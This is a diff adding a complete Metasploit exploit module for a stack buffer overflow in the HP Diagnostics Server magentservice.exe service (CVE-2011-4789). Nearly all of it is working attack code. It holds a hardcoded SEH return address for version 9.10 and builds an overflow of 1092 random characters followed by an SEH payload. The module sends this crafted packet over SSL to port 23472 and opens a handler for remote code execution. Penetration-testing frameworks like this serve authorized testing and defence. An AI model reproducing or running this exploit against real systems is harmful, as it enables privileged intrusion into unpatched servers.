@@ -1,0 +1,74 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = AverageRanking
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Exploit::Remote::Seh
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'HP Diagnostics Server magentservice.exe overflow',
+			'Description'    => %q{
+					This module exploits a stack buffer overflow in HP Diagnostics Server
+				magentservice.exe service. By sending a specially crafted packet, an attacker
+				may be able to execute arbitrary code. Originally found and posted by
+				AbdulAziz Harir via ZDI.
+			},
+			'Author'         =>
+				[
+					'AbdulAziz Hariri', # Original discovery
+					'hal',              # Metasploit module
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					['OSVDB', '72815'],
+					['CVE', '2011-4789'],
+					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-016/']
+				],
+			'Privileged'     => true,
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'seh',
+					'SSL' => true,
+					'SSLVersion' => 'SSL3'
+				},
+			'Payload'        =>
+				{
+					'Space'    => 1000,
+					'BadChars' => "\x00",
+					'StackAdjustment' => -3500
+				},
+			'Platform'       => 'win',
+			'DefaultTarget'  => 0,
+			'Targets'        =>
+				[
+					[
+						'Diagnostics Server 9.10',
+						{
+							# pop esi # pop ebx # ret 10
+							# magentservice.exe
+							'Ret' => 0x780c8f1f
+						}
+					]
+				],
+			'DisclosureDate' => 'Jan 12 2012'))
+
+			register_options([Opt::RPORT(23472)], self.class)
+	end
+
+	def exploit
+
+		req =  "\x00\x00\x00\x00"
+		req << rand_text_alpha_upper(1092)
+		req << generate_seh_payload(target.ret)
+
+		connect
+		sock.put(req)
+
+		handler
+		disconnect
+
+	end
+end
